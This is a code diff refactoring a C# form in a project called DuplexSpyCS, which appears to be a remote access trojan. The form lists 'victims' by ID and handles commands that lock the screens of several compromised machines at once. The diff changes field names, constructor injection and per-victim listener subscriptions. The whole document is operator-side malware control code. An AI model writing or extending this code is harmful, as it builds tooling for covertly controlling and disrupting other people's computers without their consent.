@@ -15,11 +15,16 @@ namespace DuplexSpyCS
 {
     public partial class frmMultiLockScreen : Form
     {
-        public List<clsVictim> l_victim;
+        public List<clsVictim> m_lsVictim { get; init; }
 
-        public frmMultiLockScreen()
+        public frmMultiLockScreen(List<clsVictim> lsVictim)
         {
             InitializeComponent();
+
+            m_lsVictim = lsVictim;
+
+            Text = $"MultiLockScreen[{m_lsVictim.Count}]";
+            StartPosition = FormStartPosition.CenterScreen;
         }
 
         private ListViewItem lviFindItemWithVictim(clsVictim v)
@@ -33,6 +38,7 @@ namespace DuplexSpyCS
                     if ((clsVictim)x.Tag == v)
                     {
                         item = x;
+                        break;
                     }
                 }
             }));
@@ -40,7 +46,7 @@ namespace DuplexSpyCS
             return item;
         }
 
-        private void Received(clsTcpListener l, clsVictim v, string[] cmd)
+        private void fnRecv(clsListener listener, clsVictim victim, List<string> cmd)
         {
             if (cmd[0] == "fun")
             {
@@ -49,10 +55,10 @@ namespace DuplexSpyCS
                     if (cmd[2] == "lock")
                     {
                         int code = int.Parse(cmd[3]);
-                        ListViewItem item = lviFindItemWithVictim(v);
+                        ListViewItem item = lviFindItemWithVictim(victim);
                         if (item == null)
                         {
-                            MessageBox.Show("lviFindItemWithVictim() return NULL value.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                            MessageBox.Show("lviFindItemWithVictim() returns NULL.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                             return;
                         }
 
@@ -81,17 +87,19 @@ namespace DuplexSpyCS
         {
             //clsStore.listener.ReceivedDecoded += Received;
 
-            for (int i = 0; i < l_victim.Count; i++)
+            for (int i = 0; i < m_lsVictim.Count; i++)
             {
                 ListViewItem item = new ListViewItem(i.ToString());
-                item.SubItems.Add(l_victim[i].ID);
+                item.SubItems.Add(m_lsVictim[i].ID);
                 item.SubItems.Add("Unlock");
-                item.Tag = l_victim[i];
+                item.Tag = m_lsVictim[i];
 
                 listView1.Items.Add(item);
+
+                m_lsVictim[i].m_listener.ReceivedDecoded += fnRecv;
             }
 
-            toolStripStatusLabel1.Text = $"Victim[{l_victim.Count}]";
+            toolStripStatusLabel1.Text = $"Victim[{m_lsVictim.Count}]";
         }
 
         private void frmMultiLockScreen_Load(object sender, EventArgs e)
@@ -164,7 +172,8 @@ namespace DuplexSpyCS
 
         private void frmMultiLockScreen_FormClosed(object sender, FormClosedEventArgs e)
         {
-            //clsStore.listener.ReceivedDecoded -= Received;
+            foreach (var victim in m_lsVictim)
+                victim.m_listener.ReceivedDecoded -= fnRecv;
         }
     }
 }
